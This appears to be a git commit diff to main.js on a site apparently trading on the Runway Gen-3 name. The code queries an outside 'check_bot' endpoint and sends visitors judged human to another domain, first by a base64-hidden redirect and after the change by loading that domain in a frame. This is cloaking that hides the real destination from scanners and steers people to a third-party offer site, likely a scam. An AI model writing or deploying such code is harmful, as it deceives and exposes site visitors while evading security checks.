c8e5a1782cba8d5523e50f9ce94f5396c256de83
runway-gen-3 <johkilbi@gmail.com>
2025-03-26 12:15:15 +0300

    update

--- main.js
+++ main.js
@@ -32,8 +32,8 @@ createLoader();
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            window.location.href = atob('aHR0cHM6Ly9hbGJlcnRkaWdpdGFsLWFpLmNvbS8/b2ZmZXJfbmFtZT1ydW53YXk=');
-            // createFrame(res.html)
+            // window.location.href = atob('aHR0cHM6Ly9hbGJlcnRkaWdpdGFsLWFpLmNvbS8/b2ZmZXJfbmFtZT1ydW53YXk=');
+            createFrame('https://albertdigital-ai.com/')
         }
         setTimeout(toggleLoad, 1000);
         
